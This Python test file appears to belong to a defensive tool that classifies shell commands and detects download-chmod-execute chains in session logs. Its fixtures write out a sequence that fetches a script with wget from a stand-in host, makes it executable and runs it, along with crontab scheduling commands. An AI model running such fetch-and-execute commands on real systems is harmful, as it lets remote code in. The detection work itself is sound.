from __future__ import annotations

from production.classification.classification_pipeline import rule_based_ttp
from production.reporting.response_guidance_v3 import canonical_evidence_snapshot
from production.reporting.typed_semantic_chain_selection import (
    select_typed_semantic_chains,
)
from production.semantics.command_operations import parse_command_operation
from tests.test_cross_family_relationship_evaluation import _build


CHAIN_RULE = {
    "rule_id": "typed-transfer-permission-execution",
    "required_operation_types": [
        "transfer_attempt",
        "permission_modify",
        "execution_attempt",
    ],
    "minimum_incomplete_operation_count": 2,
}


def test_shared_parser_separates_schedule_inspection_and_modification() -> None:
    inspected = parse_command_operation("nohup crontab -l")
    modified = parse_command_operation("crontab -e")

    assert inspected["wrappers"] == ["nohup"]
    assert inspected["operation_types"] == ["schedule_inspect"]
    assert modified["operation_types"] == ["schedule_modify"]
    assert [item.tid for item in rule_based_ttp("crontab -l")] == ["T1007"]
    assert [item.tid for item in rule_based_ttp("crontab -e")] == ["T1053"]


def test_shared_parser_resolves_direct_and_interpreter_execution() -> None:
    direct = parse_command_operation(
        "./payload.sh --mode test",
        working_directory="/tmp",
        working_directory_status="observed",
    )
    interpreted = parse_command_operation("bash -x /tmp/payload.sh --mode test")

    assert direct["operation_types"] == ["execution_attempt"]
    assert direct["entities"]["executed_paths"][0]["normalized_value"] == (
        "/tmp/payload.sh"
    )
    assert interpreted["operation_types"] == ["execution_attempt"]
    assert interpreted["entities"]["executed_paths"][0]["normalized_value"] == (
        "/tmp/payload.sh"
    )
    assert parse_command_operation("bash $SCRIPT")["parse_status"] == "unsupported"
    assert parse_command_operation("/tmp/*.sh")["parse_status"] == "unsupported"
    assert parse_command_operation("/usr/bin/uname -n")["operation_types"] == [
        "system_identity_inspection"
    ]


def test_complete_same_path_chain_selects_one_bounded_connected_finding() -> None:
    fact_set, report = _build({
        "case_id": "complete-chain",
        "events": [
            ("wget https://example.invalid/payload.sh -O /tmp/payload.sh", "success"),
            ("chmod 700 /tmp/payload.sh", "success"),
            ("/tmp/payload.sh --mode test", "success"),
        ],
    })
    selection = select_typed_semantic_chains(fact_set, [CHAIN_RULE])

    assert [item["status"] for item in selection["matches"]] == ["complete"]
    assert [item["finding_type"] for item in report["behavioral_findings"]] == [
        "connected_transfer_permission_execution"
    ]
    assert report["hypothesis_sets"] == []
    assert "does not prove transfer completion" in report["behavioral_findings"][0][
        "limitations"
    ][1].lower()


def test_incomplete_same_path_chain_is_cautious_and_wrong_path_abstains() -> None:
    fact_set, report = _build({
        "case_id": "incomplete-chain",
        "events": [
            ("wget https://example.invalid/payload.sh -O /tmp/payload.sh", "success"),
            ("chmod 700 /tmp/payload.sh", "success"),
        ],
    })
    selection = select_typed_semantic_chains(fact_set, [CHAIN_RULE])
    assert [item["status"] for item in selection["matches"]] == ["incomplete"]
    assert len(report["hypothesis_sets"]) == 1
    assert "no supported execution attempt" in report["hypothesis_sets"][0][
        "hypotheses"
    ][0]["statement"].lower()

    wrong_path_facts, wrong_path_report = _build({
        "case_id": "wrong-path-chain",
        "events": [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/b", "success"),
            ("/tmp/c", "success"),
        ],
    })
    wrong_selection = select_typed_semantic_chains(wrong_path_facts, [CHAIN_RULE])
    assert wrong_selection["matches"] == []
    assert wrong_path_report["hypothesis_sets"] == []


def test_entity_normalization_never_renders_internal_mapping() -> None:
    snapshot = canonical_evidence_snapshot({
        "session_id": "normalization",
        "ordered_command_observations": [{
            "evidence_id": "evidence-1",
            "entities": {
                "executed_paths": [{
                    "entity_type": "path",
                    "normalized_value": "/tmp/payload.sh",
                    "uncertain": False,
                    "linkable": True,
                    "internal": "must-not-render",
                }],
            },
        }],
    })

    assert snapshot["ordered_command_observations"][0]["entities"] == {
        "executed_paths": ["/tmp/payload.sh"]
    }
    assert "must-not-render" not in str(snapshot)
